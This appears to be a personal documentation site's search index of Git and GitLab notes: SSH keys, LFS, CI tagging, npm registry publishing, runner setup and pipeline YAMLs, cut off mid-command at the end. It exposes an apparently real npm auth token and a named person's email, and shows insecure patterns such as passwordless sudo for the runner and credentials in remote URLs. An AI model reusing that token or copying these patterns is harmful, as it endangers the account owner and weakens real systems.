the key to your account on GitHub.com to enable authentication for Git operations over SSH.</p> <p>Note: GitHub improved security by dropping older, insecure key types on March 15, 2022.</p> <p>As of that date, DSA keys (<code>ssh-dss</code>) are no longer supported. You cannot add new DSA keys to your personal account on GitHub.com.</p> <p>RSA keys (<code>ssh-rsa</code>) with a <code>valid_after</code> before November 2, 2021 may continue to use any signature algorithm. RSA keys generated after that date must use a SHA-2 signature algorithm. Some older clients may need to be upgraded in order to use SHA-2 signatures.</p> <ol> <li> <p>Abra Terminal.</p> </li> <li> <p>Paste the text below, substituting in your GitHub email address.</p> </li> </ol> <p><code>shell    $ ssh-keygen -t ed25519 -C \"your_email@example.com\"</code></p> <p>Note: If you are using a legacy system that doesn't support the Ed25519 algorithm, use:</p> <p><code>shell    $ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"</code></p> <p>This creates a new SSH key, using the provided email as a label.</p> <p>```shell</p> <p>Generating public/private ALGORITHM key pair.    ```</p> <p>When you're prompted to \"Enter a file in which to save the key\", you can press Enter to accept the default file location. Please note that if you created SSH keys previously, ssh-keygen may ask you to rewrite another key, in which case we recommend creating a custom-named SSH key. To do so, type the default file location and replace id_ssh_keyname with your custom key name.</p> <p>```shell</p> <p>Enter a file in which to save the key (/home/YOU/.ssh/ALGORITHM):[Press enter]    ```</p> <ol> <li>At the prompt, type a secure passphrase. For more information, see \"Working with SSH key passphrases.\"</li> </ol> <p>```shell</p> <p>Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again]    ```</p>"},{"location":"Gitlab/GitHubKeyssh/#adding-your-ssh-key-to-the-ssh-agent","title":"Adding your SSH key to the ssh-agent","text":"<p>Before adding a new SSH key to the ssh-agent to manage your keys, you should have checked for existing SSH keys and generated a new SSH key.</p> <ol> <li>Inicia el agente SSH en segundo plano.</li> </ol> <p>```shell    $ eval \"$(ssh-agent -s)\"</p> <p>Agent pid 59566    ```</p> <p>Dependiendo de tu ambiente, puede que necesites utilizar un comando diferente. Por ejemplo, es posible que tenga que usar el acceso ra\u00edz mediante la ejecuci\u00f3n de <code>sudo -s -H</code> antes de iniciar ssh-agent, o bien que tenga que usar <code>exec ssh-agent bash</code> o <code>exec ssh-agent zsh</code> ejecutar ssh-agent.</p> <ol> <li>Add your SSH private key to the ssh-agent. Si ha creado su clave con un nombre diferente o si est\u00e1 agregando una clave existente que tenga un nombre diferente, reemplace id_ed25519 en el comando con el nombre de su archivo de clave privada.</li> </ol> <p><code>shell    $ ssh-add ~/.ssh/id_ed25519</code></p> <ol> <li>Add the SSH key to your account on GitHub. For more information, see \"Adding a new SSH key to your GitHub account.\"</li> </ol>"},{"location":"Gitlab/GitHubKeyssh/#generating-a-new-ssh-key-for-a-hardware-security-key","title":"Generating a new SSH key for a hardware security key","text":"<p>If you are using macOS or Linux, you may need to update your SSH client or install a new SSH client prior to generating a new SSH key. For more information, see \"Error: Unknown key type.\"</p> <ol> <li> <p>Insert your hardware security key into your computer.</p> </li> <li> <p>Abra Terminal.</p> </li> <li> <p>Paste the text below, substituting in the email address for your account on GitHub.</p> </li> </ol> <p><code>shell    $ ssh-keygen -t ed25519-sk -C \"YOUR_EMAIL\"</code></p> <p>Note: If the command fails and you receive the error <code>invalid format</code> or <code>feature not supported,</code> you may be using a hardware security key that does not support the Ed25519 algorithm. Enter the following command instead.</p> <p><code>shell    $ ssh-keygen -t ecdsa-sk -C \"your_email@example.com\"</code></p> <ol> <li> <p>When you are prompted, touch the button on your hardware security key.</p> </li> <li> <p>When you are prompted to \"Enter a file in which to save the key,\" press Enter to accept the default file location.</p> </li> </ol> <p>```shell</p> <p>Enter a file in which to save the key (/home/YOU/.ssh/id_ed25519_sk):[Press enter]    ```</p> <ol> <li>When you are prompted to type a passphrase, press Enter.</li> </ol> <p>```shell</p> <p>Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again]    ```</p> <ol> <li>Add the SSH key to your account on GitHub. For more information, see \"Adding a new SSH key to your GitHub account.\"</li> </ol>"},{"location":"Gitlab/LFS/","title":"LFS","text":""},{"location":"Gitlab/LFS/#lfs","title":"LFS","text":""},{"location":"Gitlab/LFS/#getting-started","title":"Getting Started","text":"<ol> <li>Download and install the Git command line extension. Once downloaded and installed, set up Git LFS for your user account by running:</li> </ol> <p><code>git lfs install</code></p> <p>You only need to run this once per user account.</p> <ol> <li>In each Git repository where you want to use Git LFS, select the file types you'd like Git LFS to manage (or directly edit your .gitattributes). You can configure additional file extensions at anytime.</li> </ol> <p><code>git lfs track \"*.psd\"</code></p> <p>Now make sure .gitattributes is tracked:</p> <p><code>git add .gitattributes</code></p> <p>Note that defining the file types Git LFS should track will not, by itself, convert any pre-existing files to Git LFS, such as files on other branches or in your prior commit history. To do that, use the git lfs migrate(1) command, which has a range of options designed to suit various potential use cases.</p> <ol> <li>There is no step three. Just commit and push to GitHub as you normally would; for instance, if your current branch is named <code>main</code>:</li> </ol> <p><code>git add file.psd    git commit -m \"Add design file\"    git push origin main</code></p> <p>Check out our wiki, discussion forum, and documentation for help with any questions you might have!</p>"},{"location":"Gitlab/LFS/#git-lfs-is-an-open-source-project","title":"Git LFS is an open source project","text":"<p>To start a discussion, file an issue, or contribute to the project, head over to the repository or read our guide to contributing.</p> <p>If you're interested in integrating Git LFS into another tool or product, you might want to read the API specification or check out our reference server implementation.</p>"},{"location":"Gitlab/LFS/#to-add-mp4","title":"To add MP4","text":"<pre><code>git lfs migrate import --include=\"*.mp4\"\n</code></pre>"},{"location":"Gitlab/autoTags/","title":"Tag your Git repo using Gitlab\u2019s CI/CD pipeline","text":"<p>Photo by Pankaj Patel on Unsplash</p> <p>Git Tagging is an important feature of git in order to mark release points (v1.0, v2.0, and so on). Developers know the advantage of tagging and proper tagging is required when we release a new version.</p> <p>Nowadays, DevOps engineers are handling the build and deployment process with the help of CI/CD pipelines. After each release, we may need to tag that repo. Here, we are looking at methods of tagging using Gitlab\u2019s CI/CD pipeline code (.gitlab-ci.yml)</p> <p>Here, we are describing 2 methods for tagging:</p> <ol> <li>Using Gitlab\u2019s username and password</li> <li>Using Gitlab Personal Access Token</li> </ol>"},{"location":"Gitlab/autoTags/#method-1-using-gitlabs-username-and-password","title":"Method 1: Using Gitlab\u2019s username and password","text":"<p>This is the simplest method among the two, as we are directly using our Gitlab\u2019s username and password in the pipeline code for tagging. Given below is the code sample that we can use for tagging from CI/CD pipeline:</p> <pre><code>image: docker:19.03.12services:\n  - docker:19.03.12-dindstages: \n  - taggingTagging from pipeline: \n  stage: tagging\n  script: \n    # You can write your pipeline code for build/deploy here\n    - docker info\n  after_script:\n    - apk update &amp;&amp; apk add git\n    - git --version\n    - git remote remove origin\n    - git remote add origin https://username:password@gitlab.com/account-name/project-name\n    - git config user.email &lt;your-gitlab-email_id&gt;\n    - git config user.name &lt;your-gitlab-username&gt;\n    - git tag -a v1.0 -m \"Release version 1.0\"\n  only: \n    - master\n</code></pre> <p>Explanation: **The given code is a docker based pipeline code. We used the ***after_script* section for tagging. Here, we are installing git to the Alpine docker image. Then, we are removing the existing origin and add a new remote origin with our GitLab's username and password. We need to replace these values from the above code with our own values:</p> <ol> <li>username</li> <li>password</li> <li>account-name</li> <li>project-name</li> <li> <li> <p>As we know, going with the simplest method has its own pros and cons.</p> <p>***Pros:***</p> <ol> <li>No additional settings or configurations are required</li> </ol> <p>***Cons:***</p> <ol> <li>Gitlab\u2019s username and password are exposed in the pipeline code</li> <li>If we change our Gitlab password, we need to change that in the pipeline code too</li> </ol>"},{"location":"Gitlab/autoTags/#method-2-using-gitlab-personal-access-token","title":"Method 2: Using Gitlab Personal Access Token","text":"<p>We can use Gitlab\u2019s Personal Access Tokens to authenticate over HTTP or SSH. You can find the details about Personal Access Tokens here. In order to use this method, we will be creating a Personal Access Token first. Given below are the steps for creating a Personal Access Token:</p> <ol> <li>Login to your Gitlab account.</li> <li>In the upper right corner, click your avatar and select ***Settings***</li> <li>On the user settings menu, select ***Access Tokens***</li> <li>Choose a name and an optional expiry date for the token</li> <li>Check the scopes read_repository* and ***write_repository** from the list</li> <li>Click the Create personal access token button</li> <li>Save the personal access token somewhere safe. If you navigate away or refresh your page, and you did not save the token, you must create a new one</li> </ol> <p>Given below is an image of the Personal Access token section in Gitlab:</p> <p></p> <p>Access Token section in Gitlab</p> <p>Once the Personal Access Token is created, we can use the same code from above for tagging with some slight modification. The pipeline code with Personal Access Token is given below:</p> <pre><code>image: docker:19.03.12services:\n  - docker:19.03.12-dindstages: \n  - taggingTagging from pipeline: \n  stage: tagging\n  script: \n    # You can write your pipeline code for build/deploy here\n    - docker info\n  after_script:\n    - apk update &amp;&amp; apk add git\n    - git --version\n    - git remote remove origin\n    - git remote add origin https://oauth2:personal-access-token@gitlab.com/account-name/project-name\n    - git config user.email &lt;your-gitlab-email_id&gt;\n    - git config user.name &lt;your-gitlab-username&gt;\n    - git tag -a v1.0 -m \"Release version 1.0\"\n  only: \n    - master\n</code></pre> <p>Explanation: **Here, the main difference from the above method (Method 1) is, we have replaced ***username:password* with ***oauth2:personal-access-token*** in the line for adding the remote origin (Remember to replace personal-access-token with the token that we created). So, the values that need to be replaced are:</p> <ol> <li>personal-access-token</li> <li>account-name</li> <li>project-name</li> <li> <li> <p>The advantages of using this method are:</p> <ol> <li>We are not exposing Gitlab\u2019s credentials</li> <li>Personal Access Token can be revoked at any time and can create a new one</li> </ol> <p>We can use Gitlab\u2019s pipeline variables for storing these values (secrets) and then use those variables in our pipeline code. In this way, we can avoid using those credentials in code as plaintext.</p> <p>Thanks ! ! !</p>"},{"location":"Gitlab/credentials/","title":"Credentials","text":"<pre><code>git config --global credential.helper store\n</code></pre> <pre><code>sudo git credential-store --file /root/.git-credential store\n</code></pre> <pre><code>sudo git config --global credential.helper \"store --file /root/.git-credentials\"\n</code></pre>"},{"location":"Gitlab/gitcommands-RafaBTS/","title":"gitcommands RafaBTS","text":"<pre><code>git config --global user.name \"Rafael Madolell Vargas\"\ngit config --global user.email \"rafaelm@bluetrailsoft.com\"\n</code></pre>"},{"location":"Gitlab/gitcommands-RafaBTS/#create-a-new-repository","title":"Create a new repository","text":"<pre><code>git clone git@gitlab.com:rafaelm2/canal-denuncias.git\ncd canal-denuncias\ngit switch -c main\ntouch README.md\ngit add README.md\ngit commit -m \"add README\"\ngit push -u origin main\n</code></pre>"},{"location":"Gitlab/gitcommands-RafaBTS/#push-an-existing-folder","title":"Push an existing folder","text":"<pre><code>cd existing_folder\ngit init --initial-branch=main\ngit remote add origin git@gitlab.com:rafaelm2/canal-denuncias.git\ngit add .\ngit commit -m \"Initial commit\"\ngit push -u origin main\n</code></pre>"},{"location":"Gitlab/gitcommands-RafaBTS/#push-an-existing-git-repository","title":"Push an existing Git repository","text":"<pre><code>cd existing_repo\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:rafaelm2/canal-denuncias.git\ngit push -u origin --all\ngit push -u origin --tags\n</code></pre> <p>Steps </p> <pre><code>ssh-keygen -b 2048 -t rsa -C \"email\"\n</code></pre> <pre><code>git clone \"ssh token\" #clonar repo\ngit status # estado del git\ngit add . # a\u00f1adir archivos\ngit commit -m \"Firts commit\" # comparar archivos a\u00f1adidos\ngit push origin &lt;name&gt; # subir archivos\ngit pull origin &lt;name&gt; # descargar archivos\ngit branch &lt;name&gt; # crear rama\ngit checkout &lt;name&gt; # escoger rama\nTodos los dias\ngit checkout &lt;MAIN_BRANCH&gt; \ngit pull origin &lt;BRANCH&gt; \ngit checkout &lt;WORK_BRANCH&gt; \ngit merge &lt;MAIN_BRANCH&gt;\n\ngit branch -D &lt;BRANC&gt; # borrar rama\n</code></pre>"},{"location":"Gitlab/gitcommands/","title":"Gitcommands","text":"<pre><code>git config --global user.name \"Rafael Madolell Vargas\"\ngit config --global user.email \"rafaelm@bluetrailsoft.com\"\n</code></pre>"},{"location":"Gitlab/gitcommands/#create-a-new-repository","title":"Create a new repository","text":"<pre><code>git clone git@gitlab.com:rafaelm2/canal-denuncias.git\ncd canal-denuncias\ngit switch -c main\ntouch README.md\ngit add README.md\ngit commit -m \"add README\"\ngit push -u origin main\n</code></pre>"},{"location":"Gitlab/gitcommands/#push-an-existing-folder","title":"Push an existing folder","text":"<pre><code>cd existing_folder\ngit init --initial-branch=main\ngit remote add origin git@gitlab.com:rafaelm2/canal-denuncias.git\ngit add .\ngit commit -m \"Initial commit\"\ngit push -u origin main\n</code></pre>"},{"location":"Gitlab/gitcommands/#push-an-existing-git-repository","title":"Push an existing Git repository","text":"<pre><code>cd existing_repo\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:rafaelm2/canal-denuncias.git\ngit push -u origin --all\ngit push -u origin --tags\n</code></pre> <p>Steps </p> <pre><code>ssh-keygen -b 2048 -t rsa -C \"email\"\n</code></pre> <pre><code>git clone \"ssh token\" #clonar repo\ngit status # estado del git\ngit add . # a\u00f1adir archivos\ngit commit -m \"Firts commit\" # comparar archivos a\u00f1adidos\ngit push origin &lt;name&gt; # subir archivos\ngit pull origin &lt;name&gt; # descargar archivos\ngit branch &lt;name&gt; # crear rama\ngit checkout &lt;name&gt; # escoger rama\nTodos los dias\ngit checkout main \ngit pull origin main\ngit checkout test\ngit merge main\n\ngit branch -D &lt;name&gt; # brorrar rama\n</code></pre>"},{"location":"Gitlab/gitlabPackageRegistry/","title":"gitlabPackageRegistry","text":""},{"location":"Gitlab/gitlabPackageRegistry/#gitlab-package-registry","title":"Gitlab Package Registry","text":""},{"location":"Gitlab/gitlabPackageRegistry/#agregar-registro-via-terminal","title":"Agregar registro v\u00eda terminal","text":"<p>Primero agregaremos el registro del package en el package.json</p> <pre><code>{\n\"publishConfig\": { \"@foo:registry\":\" https://gitlab.example.com/api/v4/projects/&lt;your_project_id&gt;/packages/npm/\" }\n}\n</code></pre> <p>Ejemplo:</p> <pre><code>  \"publishConfig\": {\n    \"@rafaelm:registry\": \"https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\"\n  },\n</code></pre> <p></p> <p>Para publicar nuestros paquetes debemos crear un archivo de configuracion llamado <code>.npmrc</code></p> <p>este contendr\u00e1 el url del registro y su token de autentificacion.</p> <pre><code>.npmrc\n@foo:registry=https://gitlab.example.com/api/v4/projects/${CI_PROJECT_ID}/packages/npm/\n//gitlab.example.com/api/v4/projects/${CI_PROJECT_ID}/packages/npm/:_authToken=${CI_JOB_TOKEN}\n</code></pre> <p>Ejemplo:</p> <pre><code>//gitlab.bluetrail.software/api/v4/projects/486/packages/npm/:_authToken=LhPRciy4nBNeuUS_g_kY\n@rafaelm:registry https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\nregistry=https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\n</code></pre> <p>Para agregar estas credenciales v\u00eda terminal agregaremos estos dos comandos.</p> <pre><code>npm config set -- '//gitlab.example.com/api/v4/projects/&lt;your_project_id&gt;/packages/npm/:_authToken' \"${NPM_TOKEN}\"\nnpm config set -- '//gitlab.example.com/api/v4/packages/npm/:_authToken' \"${NPM_TOKEN}\"\n</code></pre> <p>Una vez tengamos esta configuraci\u00f3n preparada solo necesitamos lanzar el siguiente comando.</p> <p><code>npm publish</code></p> <p><code>NPM_TOKEN=&lt;your_token&gt; npm publish</code></p> <p><code>npm publish --registry=https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/</code></p> <p>Es importante agregar el .npmrc al gitignore.</p>"},{"location":"Gitlab/gitlabPackageRegistry/#lanza-registro-via-pipeline","title":"Lanza registro v\u00eda pipeline.","text":"<p>Debemos crear un token de despliegue y agregarlo a las variables de GITLAB.</p> <p>Agregaremos un stage a nuestra pipeline con la siguiente configuraci\u00f3n.</p> <pre><code>package-registry:\n  image: node:latest\n  stage: package-registry\n  tags:\n    - htzdoc\n  script:\n    - echo \"//${CI_SERVER_HOST}/api/v4/projects/${CI_PROJECT_ID}/packages/npm/:_authToken=${REGISTRY_TOKEN}\"&gt;&gt;.npmrc\n    - echo \"@rafaelm:registry https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\"&gt;&gt;.npmrc\n    - echo \"registry=https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\"&gt;&gt;.npmrc\n    - cat .npmrc\n    - npm config set @rafaelm:registry https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\n    - npm config set -- '//gitlab.bluetrail.software/api/v4/projects/486/packages/npm/:_authToken' \"$REGISTRY_TOKEN\"\n    - npm publish --registry=https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\n  environment: development\n  only:\n    changes:\n      - /package.json\n      - package.json\n</code></pre>"},{"location":"Gitlab/gitlabRunner/","title":"Gitlab Cheatsheet","text":""},{"location":"Gitlab/gitlabRunner/#gitlab-runner","title":"Gitlab Runner","text":"<p>create user</p> <pre><code>sudo gitlab-runner install --working-directory /home/ec2-user --user ec2-user --syslog --config /home/ec2-user/.gitlab-runner/config.toml\n</code></pre> <p>On Ubuntu 20.04 gitlab ruuner show a error if you don't delete a:</p> <pre><code>sudo rm /home/gitlab-runner/.bash_logout\n</code></pre> <p>Permissions</p> <pre><code>sudo chown -R gitlab-runner /var/run/docker.sock\n</code></pre> <p><code>/etc/gitlab-runner/conf.toml</code></p> <pre><code>concurrent = 1\ncheck_interval = 0\n\n[[runners]]\n  name = \"#####\"\n  url = \"#####\"\n  token = \"#####\"\n  executor = \"docker\"\n  [runners.docker]\n    tls_verify = false\n    image = \"docker:latest\"\n    privileged = false\n    disable_cache = false\n    cache_dir = \"cache\"\n    volumes = [\"/var/run/docker.sock:/var/run/docker.sock\", \"/cache\"]\n  [runners.cache]\n    Insecure = false\n</code></pre> <p>docker:dind ---&gt; conf.toml in <code>/etc/gitlab-runner</code></p> <pre><code>volumes = [\"/var/run/docker.sock:/var/run/docker.sock\", \"/cache\"]\n  [runners.cache]\n    Insecure = false\n</code></pre> <pre><code>volumes = [\"/cache\", \"/var/run/docker.sock:/var/run/docker.sock\"] # Ubuntu Jammy 22.04\n</code></pre>"},{"location":"Gitlab/gitlabRunner/#grant-sudo-permissions","title":"Grant sudo permissions","text":"<p>You can grant sudo permissions to the <code>gitlab-runner</code> user as this is who is executing the build script.</p> <pre><code>$ sudo usermod -a -G sudo gitlab-runner\n</code></pre> <p>You now have to remove the password restriction for <code>sudo</code> for the <code>gitlab-runner</code> user.</p> <p>Start the sudo editor with</p> <pre><code>$ sudo visudo\n</code></pre> <p>Now add the following to the bottom of the file</p> <pre><code>gitlab-runner ALL=(ALL) NOPASSWD:ALL\n</code></pre> <p>Do not do this for gitlab runners that can be executed by untrusted users.</p> <p></p>"},{"location":"Gitlab/pipeExampleCartier/","title":"pipeExampleCartier","text":"<pre><code>---\nvariables:\n  DOCKER_DRIVER: overlay2\n  DOCKER_TLS_CERTDIR: \"\"\n  PG_HOST: postgres\n  PG_PORT: 5432\n  POSTGRES_DB: alg_database\n  POSTGRES_USER: postgres\n  POSTGRES_PASSWORD: \"123456\"\n  POSTGRES_HOST_AUTH_METHOD: trust\n\nservices:\n  - postgres:13-alpine\n\nstages:\n  - mcuy\n  - build\n  - test\n  - package\n  - tagging\n\nbuild:\n  stage: build\n  image: node:16-alpine3.14\n  tags:\n    - docker\n  script:\n    - npm install\n    - npm run build\n    - cd public\n    - npm install --omit-dev\n    - npm run build\n  allow_failure: false\n  cache:\n    paths:\n      - node_modules/\n      - public/node_modules/\n  artifacts:\n    expire_in: 1 days\n    when: on_success\n    paths:\n      - node_modules/\n      - public/node_modules/\n      - dist/\n      - public/build/\n  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n\ntest:\n  stage: test\n  needs:\n    - build\n  dependencies:\n    - build\n  image: node:16-alpine3.14\n  coverage: /All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/\n  services:\n   - postgres\n  tags:\n    - docker\n  script:\n    - npm run autotest\n  allow_failure: false\n  artifacts:\n    when: always\n    reports:\n      junit:\n        - junit.xml\n  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n\npackage:\n  stage: package\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - docker\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n    - VERSION=\"$(cat ./changelog/version.md)_$CI_MERGE_REQUEST_TARGET_BRANCH_NAME\"\n  script:\n    - docker build . --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:$VERSION\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  allow_failure: false\n  dependencies:\n    - test\n  rules:\n    - if: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\"\n    - if: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"develop\"\n\ntag:\n  tags:\n    - docker\n  stage: tagging\n  image: bitnami/git:latest\n  allow_failure: false\n  dependencies:\n    - \"package\"\n  script:\n    - VERSION=\"$(cat ./changelog/version.md)\"_$CI_MERGE_REQUEST_TARGET_BRANCH_NAME;\n    - echo $VERSION_\n    - git config --global user.name \"${GITLAB_USER_NAME}\"\n    - git config --global user.email \"${GITLAB_USER_EMAIL}\"\n    - &gt;\n      if [ \"$(git remote -v | grep 'api-origin')\" ]; then\n        echo \"Remote has been re-established\";\n        git remote remove api-origin;\n        git remote add api-origin https://oauth2:${TAG_TOKEN}@gitlab.com/cartier-lab/alg-backend;\n      else\n        echo \"Remote has been created\"\n        git remote add api-origin https://oauth2:${TAG_TOKEN}@gitlab.com/cartier-lab/alg-backend;\n      fi\n    - &gt;\n      if [ $(git tag -l \"$VERSION\") ]; then\n        echo \"Version $VERSION already exists\";\n        exit 1;\n      else\n        git tag -a $VERSION -m \"Version $VERSION\";\n        git push api-origin $VERSION;\n      fi\n  rules:\n    - if: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\"\n\nmcuy:\n  stage: mcuy\n  when: manual\n  tags:\n    - mcuy-runner\n  script:\n    - whoami\n    # - cd ~/alg-repositories/cartier_lg_web\n# # Login might be asked to pull from this repository\n#     - git stash\n#     - git pull\n#     - cd ~/alg-repositories/megacomputer-scripts\n# # Login might be asked to pull from this repository\n#     - git pull\n#     - sudo ./uninstall.sh\n#     - sudo ./install.sh MEGA_COMPUTER 192.168.121.101 root root /data/cartier/cartier_realtime_data\n\n# # Replace the configuration files to include alg-backend in the docker-compose and nginx configuration\n#     - cp ~/alg-repositories/megacomputer-scripts/config/nginx.conf ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config/nginx\n#     - cp ~/alg-repositories/megacomputer-scripts/config/docker-compose.yml ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime\n#     - cp ~/alg-repositories/megacomputer-scripts/config/.env_api_backend ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime\n#     - cp ~/alg-repositories/megacomputer-scripts/config/.env_postgres ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime\n#     - cp ~/alg-repositories/megacomputer-scripts/config/.env_elastic ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime\n#     - cp ~/alg-repositories/megacomputer-scripts/config/filebeat.yml ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config\n#     - cp ~/alg-repositories/megacomputer-scripts/config/logstash.conf ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config\n#     - cd ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime\n#     - docker-compose stop\n# # Login might be asked to pull from docker registry\n#     - docker-compose pull\n#     - export  DATA_ROOT_PATH=/data/cartier/cartier_realtime_data\n#     - export COMPOSE_UID=$(id -u)\n#     - export COMPOSE_GUID=$(id -g)\n#     - docker-compose up -d --force-recreate\n\n\nbuild-tokyo:\n  stage: build\n  image: node:16-alpine3.14\n  tags:\n    - docker\n  script:\n    - npm install\n    - npm run build\n    - cd public\n    - npm install --omit-dev\n    - npm run build\n  allow_failure: false\n  cache:\n    paths:\n      - node_modules/\n      - public/node_modules/\n  artifacts:\n    expire_in: 1 days\n    when: on_success\n    paths:\n      - node_modules/\n      - public/node_modules/\n      - dist/\n      - public/build/\n  only:\n    - tokyo\n\npackage-tokyo:\n  stage: package\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - docker\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n  script:\n    - docker build . --tag $CI_REGISTRY_IMAGE:tokyo-latest --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:tokyo-latest\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  allow_failure: false\n  dependencies:\n    - build-tokyo\n  only:\n    - tokyo\n</code></pre> <pre><code>---\nvariables:\n  DOCKER_DRIVER: overlay2\n  DOCKER_TLS_CERTDIR: ''\n  PG_HOST: postgres\n  PG_PORT: 5432\n  POSTGRES_DB: alg_database\n  POSTGRES_USER: postgres\n  POSTGRES_PASSWORD: '123456'\n  POSTGRES_HOST_AUTH_METHOD: trust\n\nservices:\n  - postgres:13-alpine\n\nstages:\n  - MCS\n  - build\n  - test\n  - develop\n  - ready2test\n  - release\n  - package\n  - tagging\n\nbuild:\n  stage: build\n  image: node:16-alpine3.14\n  tags:\n    - docker\n  script:\n    - npm install\n    - npm run build\n    - cd public\n    - npm install --omit-dev\n    - npm run build\n  allow_failure: false\n  cache:\n    paths:\n      - node_modules/\n      - public/node_modules/\n  artifacts:\n    expire_in: 1 days\n    when: on_success\n    paths:\n      - node_modules/\n      - public/node_modules/\n      - dist/\n      - public/build/\n  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event' || $CI_COMMIT_BRANCH =~ \"/^release.+/\"\n\ntest:\n  stage: test\n  needs:\n    - build\n  dependencies:\n    - build\n  image: node:16-alpine3.14\n  coverage: /All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/\n  services:\n    - postgres\n  tags:\n    - docker\n  script:\n    - npm run autotest\n  allow_failure: false\n  artifacts:\n    when: always\n    reports:\n      junit:\n        - junit.xml\n  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event' || $CI_COMMIT_BRANCH =~ \"/^release.+/\"\n\ndevelop:\n  stage: develop\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - docker\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n    - VERSION=\"$(cat ./changelog/version.md)_develop\"\n  script:\n    - docker build . --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:$VERSION\n    - docker push $CI_REGISTRY_IMAGE:$VERSION_$CI_COMMIT_SHA\n  allow_failure: false\n  dependencies:\n    - test\n  only:\n    - develop\n\nrelease:\n  stage: release\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - docker\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n    - VERSION=\"release_$(cat ./changelog/version.md)\"\n  script:\n    - docker build . --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:$VERSION_$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:$VERSION\n  allow_failure: false\n  dependencies:\n    - test\n  rules:\n    - if: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME =~ /^release.+/ || $CI_COMMIT_BRANCH =~ \"/^release.+/\"\n\npackage:\n  stage: package\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - docker\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n    - VERSION=\"$(cat ./changelog/version.md)_main\"\n  script:\n    - docker build . --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:$VERSION\n    - docker push $CI_REGISTRY_IMAGE:$VERSION_$CI_COMMIT_SHA\n  allow_failure: false\n  dependencies:\n    - test\n  only:\n    - main\n\ntag:\n  tags:\n    - docker\n  stage: tagging\n  image: bitnami/git:latest\n  allow_failure: false\n  dependencies:\n    - 'package'\n  script:\n    - VERSION=\"$(cat ./changelog/version.md)\";\n    - echo $VERSION\n    - git config --global user.name \"${GITLAB_USER_NAME}\"\n    - git config --global user.email \"${GITLAB_USER_EMAIL}\"\n    - &gt;\n      if [ \"$(git remote -v | grep 'api-origin')\" ]; then\n        echo \"Remote has been re-established\";\n        git remote remove api-origin;\n        git remote add api-origin https://oauth2:${TAG_TOKEN}@gitlab.com/cartier-lab/alg-backend;\n      else\n        echo \"Remote has been created\"\n        git remote add api-origin https://oauth2:${TAG_TOKEN}@gitlab.com/cartier-lab/alg-backend;\n      fi\n    - &gt;\n      if [ $(git tag -l \"$VERSION\") ]; then\n        echo \"Version $VERSION already exists\";\n        echo \"Recreating...\"\n        git tag --delete $VERSION\n        git tag -a $VERSION -m 